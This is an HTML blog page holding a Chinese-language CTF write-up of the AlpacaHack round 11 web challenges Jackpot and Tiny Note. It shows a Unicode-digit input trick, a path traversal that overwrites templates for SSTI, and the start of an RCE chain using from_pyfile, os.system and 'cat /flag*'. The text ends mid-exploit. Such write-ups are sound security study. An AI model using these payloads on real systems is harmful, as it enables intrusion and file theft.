@@ -1,0 +1,719 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    alpacahack round 11 web - Jackpot &amp; Tiny Note |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="alpacahack round 11 web - Jackpot &amp; Tiny Note Author : 堇姬 Naup  前言那天在忙，只打了第一題，這篇順便補另外一題 (窩不會 XSS) Jackpot1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
+<meta property="og:type" content="article">
+<meta property="og:title" content="alpacahack round 11 web - Jackpot &amp; Tiny Note">
+<meta property="og:url" content="http://example.com/2025/05/30/alpacahack-round-11-web-writeup/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="alpacahack round 11 web - Jackpot &amp; Tiny Note Author : 堇姬 Naup  前言那天在忙，只打了第一題，這篇順便補另外一題 (窩不會 XSS) Jackpot1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/05/30/alpacahack-round-11-web-writeup/upload_c923776d05134bf4d888cb548a87de4c.png">
+<meta property="og:image" content="http://example.com/2025/05/30/alpacahack-round-11-web-writeup/upload_30d756bbf9e3af09efff642a389de548.png">
+<meta property="article:published_time" content="2025-05-30T01:07:57.000Z">
+<meta property="article:modified_time" content="2025-05-30T01:11:16.878Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/30/alpacahack-round-11-web-writeup/upload_c923776d05134bf4d888cb548a87de4c.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="https://i.imgur.com/OjUqWVO.jpeg" alt="alpacahack round 11 web - Jackpot &amp; Tiny Note">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">alpacahack round 11 web - Jackpot &amp; Tiny Note</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#alpacahack-round-11-web-Jackpot-Tiny-Note"><span class="toc-number">1.</span> <span class="toc-text">alpacahack round 11 web - Jackpot &amp; Tiny Note</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackpot"><span class="toc-number">1.2.</span> <span class="toc-text">Jackpot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tiny-Note"><span class="toc-number">1.3.</span> <span class="toc-text">Tiny Note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#source-code"><span class="toc-number">1.3.1.</span> <span class="toc-text">source code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bug"><span class="toc-number">1.3.2.</span> <span class="toc-text">bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">1.4.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">71</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-alpacahack-round-11-web-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/30/alpacahack-round-11-web-writeup/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-30T01:07:57.000Z" itemprop="datePublished">2025-05-30</time>
+    <time style="display: none;" id="post-update-time">2025-05-30</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="alpacahack-round-11-web-Jackpot-Tiny-Note"><a href="#alpacahack-round-11-web-Jackpot-Tiny-Note" class="headerlink" title="alpacahack round 11 web - Jackpot &amp; Tiny Note"></a>alpacahack round 11 web - Jackpot &amp; Tiny Note</h1><blockquote>
+<p>Author : 堇姬 Naup</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>那天在忙，只打了第一題，這篇順便補另外一題 (窩不會 XSS)</p>
+<h2 id="Jackpot"><a href="#Jackpot" class="headerlink" title="Jackpot"></a>Jackpot</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> BadRequest, HTTPException</span><br><span class="line"><span class="keyword">import</span> os, re, random, json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;Alpaca&#123;dummy&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">value: <span class="built_in">str</span> | <span class="literal">None</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">if</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">&quot;Missing parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r&quot;\d+&quot;</span>, value):</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">&quot;Not decimal digits&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">&quot;Too little candidates&quot;</span>)</span><br><span class="line"></span><br><span class="line">    candidates = <span class="built_in">list</span>(value)[:<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(candidates) != <span class="built_in">len</span>(<span class="built_in">set</span>(candidates)):</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">&quot;Not unique&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> candidates]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/slot&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slot</span>():</span><br><span class="line">    candidates = validate(request.args.get(<span class="string">&quot;candidates&quot;</span>))</span><br><span class="line"></span><br><span class="line">    num = <span class="number">15</span></span><br><span class="line">    results = random.choices(candidates, k=num)</span><br><span class="line"></span><br><span class="line">    is_jackpot = results == [<span class="number">7</span>] * num  <span class="comment"># 777777777777777</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;code&quot;</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="string">&quot;results&quot;</span>: results,</span><br><span class="line">            <span class="string">&quot;isJackpot&quot;</span>: is_jackpot,</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> is_jackpot <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">HTTPException</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_exception</span>(<span class="params">e</span>):</span><br><span class="line">    response = e.get_response()</span><br><span class="line">    response.data = json.dumps(&#123;<span class="string">&quot;code&quot;</span>: e.code, <span class="string">&quot;description&quot;</span>: e.description&#125;)</span><br><span class="line">    response.content_type = <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一個 slot 的網站，如果可以骰到 15 個 7 就可以拿到 flag<br>通過 candidates args 可以去決定 random 的集合，這個集合長度為 10<br>不過這個集合有進行驗證，他驗證個方法是將這個傳入的長度與轉成集合後的長度去對比<br>因為轉成集合後不一樣的會被刪除，因此傳入的 candidates 不能有相同的字元</p>
+<p>最後把傳入的字串轉為 int<br>這邊就會有問題了，python 會去把 unicode 字元通過 int 轉換成數字<br>因此只要找到 10 種不同的 unicode 通過 int 會轉換成 7 就可以成功了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://34.170.146.252:33352/slot?candidates=%EF%BC%97%D9%A7%F0%9D%9F%A9%E0%BB%97%F0%9D%9F%9F%E1%81%87%E0%A7%AD%EA%98%A7%DB%B7%DF%87</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Flag : Alpaca{what_i5_your_f4vorite_s3ven?}</p>
+</blockquote>
+<h2 id="Tiny-Note"><a href="#Tiny-Note" class="headerlink" title="Tiny Note"></a>Tiny Note</h2><h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>兩個服務，一個是後端，一個是 nginx<br>他把後端架在內網，並用 nginx proxy 到內網</p>
+<p>後端出不了網</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">  tiny-note:</span><br><span class="line">    build: ./web</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    init: true</span><br><span class="line">    networks:</span><br><span class="line">      - isolated</span><br><span class="line">  tiny-note-nginx:</span><br><span class="line">    build:</span><br><span class="line">      context: ./nginx</span><br><span class="line">      dockerfile_inline: |</span><br><span class="line">        <span class="keyword">FROM</span> nginx:<span class="number">1.27</span>.<span class="number">5</span></span><br><span class="line">        <span class="keyword">COPY</span><span class="language-bash"> ./nginx.conf /etc/nginx/conf.d/default.conf</span></span><br><span class="line">    ports:</span><br><span class="line">      - $&#123;PORT:-<span class="number">3000</span>&#125;:<span class="number">3000</span></span><br><span class="line">    networks:</span><br><span class="line">      - default</span><br><span class="line">      - isolated</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  isolated:</span><br><span class="line">    internal: true</span><br></pre></td></tr></table></figure>
+
+<p>所有的服務，path 若以 <code>/</code> 開頭都會用 nginx proxy 到內網</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 3000;</span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass http://tiny-note:3000;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>初始化</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;CACHE_TYPE&quot;</span>] = <span class="string">&quot;FileSystemCache&quot;</span>      <span class="comment"># 使用檔案系統快取</span></span><br><span class="line">app.config[<span class="string">&quot;CACHE_DIR&quot;</span>] = <span class="string">&quot;/tmp/cache&quot;</span>             <span class="comment"># 快取目錄設為 /tmp/cache</span></span><br><span class="line">cache = Cache(app)                                 <span class="comment"># 初始化快取</span></span><br><span class="line">cache.clear()                                      <span class="comment"># 清空快取</span></span><br><span class="line">shutil.rmtree(<span class="string">&quot;./notes&quot;</span>, ignore_errors=<span class="literal">True</span>)      <span class="comment"># 刪除 ./notes 目錄(筆記資料夾)</span></span><br></pre></td></tr></table></figure>
+
+<p>這邊設定 CACHE，並指定 <code>/tmp/cache</code> 為快取目錄<br>並且去初始化快取並清空，以及清空舊的 note</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/new&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>():</span><br><span class="line">    title = validate(<span class="string">&quot;title&quot;</span>, request.form.get(<span class="string">&quot;title&quot;</span>), (<span class="number">1</span>, <span class="number">64</span>))</span><br><span class="line">    content = validate(<span class="string">&quot;content&quot;</span>, request.form.get(<span class="string">&quot;content&quot;</span>), (<span class="number">1</span>, <span class="number">24</span>))  <span class="comment"># 非常短的限制</span></span><br><span class="line"></span><br><span class="line">    slug = pathlib.Path(<span class="built_in">str</span>(uuid.uuid4())) / urllib.parse.quote(title)</span><br><span class="line">    path = <span class="string">&quot;./notes&quot;</span> / slug</span><br><span class="line">    path.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">open</span>(path, mode=<span class="string">&quot;w&quot;</span>).write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">f&quot;/<span class="subst">&#123;slug&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>通過 &#x2F;create post 來去傳入 title 跟 content</p>
+<ul>
+<li>title 限制 64 個字元</li>
+<li>content 限制 24 個字元</li>
+</ul>
+<p>他會去做 validate</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">label: <span class="built_in">str</span>, text: <span class="built_in">str</span> | <span class="literal">None</span>, limit: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> text <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">f&quot;<span class="subst">&#123;label&#125;</span>: Missing parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text) &lt; limit[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">f&quot;<span class="subst">&#123;label&#125;</span>: Too short&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text) &gt; limit[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">f&quot;<span class="subst">&#123;label&#125;</span>: Too long&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">raise</span> BadRequest(<span class="string">f&quot;<span class="subst">&#123;label&#125;</span>: Path traversal?&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure>
+<p>他會去驗證長度以及看是否有 <code>..</code> 去過濾 path traversal</p>
+<p>之後</p>
+<ul>
+<li>使用 uuid.uuid4() 產生一個隨機的唯一 ID（當作資料夾名）。</li>
+<li>將標題 title 用 URL 編碼（urllib.parse.quote）作為檔案名稱，組合成路徑 <code>./notes/&lt;UUID&gt;/&lt;encoded_title&gt;</code></li>
+<li>確保父目錄存在 (mkdir(parents&#x3D;True, exist_ok&#x3D;True))。</li>
+<li>將 content 寫入該檔案。</li>
+<li>最後重導向到 &#x2F;UUID&#x2F;標題，即剛建立的筆記頁面</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&lt;uuid:id&gt;/&lt;string:title&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@cache.cached(<span class="params">timeout=<span class="number">5</span>, query_string=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_note</span>(<span class="params"><span class="built_in">id</span>: uuid.UUID, title: <span class="built_in">str</span></span>):</span><br><span class="line">    title = validate(<span class="string">&quot;title&quot;</span>, title, (<span class="number">1</span>, <span class="number">64</span>))</span><br><span class="line">    path = pathlib.Path(<span class="string">&quot;./notes&quot;</span>) / <span class="built_in">str</span>(<span class="built_in">id</span>) / urllib.parse.quote(title)</span><br><span class="line">    content = <span class="built_in">open</span>(path).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Alpaca&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">        content = <span class="string">&quot;REDACTED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;note.html&quot;</span>, title=title, content=content)</span><br></pre></td></tr></table></figure>
+<p>這部分會把你的 note 顯示出來</p>
+<h3 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h3><p>首先是雖然過濾掉了 <code>..</code><br>但是仍舊存在 path traversal</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pathlib, uuid, shutil, urllib.parse</span><br><span class="line">title = <span class="string">&quot;/aa&quot;</span></span><br><span class="line"></span><br><span class="line">aa = pathlib.Path(<span class="built_in">str</span>(uuid.uuid4())) / urllib.parse.quote(title)</span><br><span class="line"><span class="built_in">print</span>(aa)</span><br></pre></td></tr></table></figure>
+
+<p>如果 title 的開頭是 <code>/</code><br>那他會無視前面的 path 串接<br>直接把後面的當根目錄，這樣就可以 path traversal 來任意寫檔</p>
+<p>我們可以去寫 .html，來做 SSTI</p>
+<p>驗證一下，我們先寫掉 <code>/app/templates/note.html</code> 成 <code>&#123;&#123;7*7&#125;&#125;</code><br>之後去創建一個新的 note，當他 redirect 後就會看到 49</p>
+<img src="/2025/05/30/alpacahack-round-11-web-writeup/upload_c923776d05134bf4d888cb548a87de4c.png" class="">
+
+<p>至此可以驗證 SSTI 可以成功<br>這邊開始思考如何串 SSTI，因為有個限制只能輸入 24 bytes 的 SSTI payload<br>首先想先思考如何 RCE<br>如果可以通過 RCE 把 flag 寫到 templates 下<br>在通過 <a target="_blank" rel="noopener" href="https://ttl255.com/jinja2-tutorial-part-6-include-and-import/">include</a> 把他引入</p>
+<p>有一個簡短的方式可以拿到 python 任意執行，就是用 confid 下的 <a target="_blank" rel="noopener" href="https://spacewander.github.io/explore-flask-zh/5-configuration.html">from_pyfile</a><br>他會用來跑 python<br>所以我們先創建這些檔案</p>
+<ul>
+<li>&#x2F;app&#x2F;a.py : <code>import os;r=os.system</code></li>
+<li>&#x2F;app&#x2F;b : <code>import a;a.r(&quot;sh /sc&quot;)</code></li>
+<li>&#x2F;sc : <code>cat /flag* &gt; templates/f</code></li>
+</ul>
